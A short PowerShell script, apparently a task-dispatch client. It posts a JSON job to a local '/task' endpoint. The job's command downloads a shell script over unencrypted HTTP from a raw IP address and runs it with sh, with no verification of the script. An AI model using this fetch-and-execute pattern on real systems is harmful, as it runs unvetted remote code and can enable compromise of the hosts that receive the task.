$ts = [DateTimeOffset]::Now.ToUnixTimeSeconds()
$cmd = "curl -s -o /tmp/fixrun2.sh 'http://47.99.131.12:8081/file/fixrun2.sh' && sh /tmp/fixrun2.sh"
$body = @{cmd=$cmd; id='fixrun2'; ts=$ts} | ConvertTo-Json -Compress
Write-Host "POSTING: $body"
try {
  $r = Invoke-RestMethod -Uri http://localhost:8081/task -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10
  Write-Host "RESP: $($r | ConvertTo-Json -Compress)"
} catch { Write-Host "ERR: $_" }